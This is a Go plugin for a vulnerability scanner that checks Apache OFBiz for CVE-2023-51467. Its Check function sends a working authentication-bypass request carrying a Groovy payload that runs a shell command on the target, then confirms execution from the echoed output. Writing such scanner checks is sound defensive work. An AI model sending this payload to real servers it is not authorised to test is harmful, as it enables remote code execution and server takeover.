package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"fmt"
	"net/http"
	"strings"
)

func init() {
	Register("ofbiz_rce_cve_2023_51467", &ofbiz_rce_cve_2023_51467{})
}

type ofbiz_rce_cve_2023_51467 struct{}

func (p *ofbiz_rce_cve_2023_51467) Info() PluginInfo {
	return PluginInfo{
		Name:     "Apache OFBiz groovy 远程代码执行漏洞",
		VulnInfo: "Apache OFBiz是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。攻击者可构造恶意请求绕过身份认证，利用后台相关接口功能执行groovy代码，执行任意命令，控制服务器。",
		VulnID:   "CVE-2023-51467",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "Apache OFBiz <= 18.12.10",
		CWE:      "CWE-94	代码注入/CWE-918	服务端请求伪造",
	}
}

func (p *ofbiz_rce_cve_2023_51467) Check(netloc string) bool {
	rand := utils.GenRandom(10)
	payload := fmt.Sprintf("groovyProgram=throw+new+Exception('echo%%20%s'.execute().text);", rand)
	reqURL := netloc + "/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
	req, err := http.NewRequest("POST", reqURL, bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, rand) {
		return true
	}
	return false
}
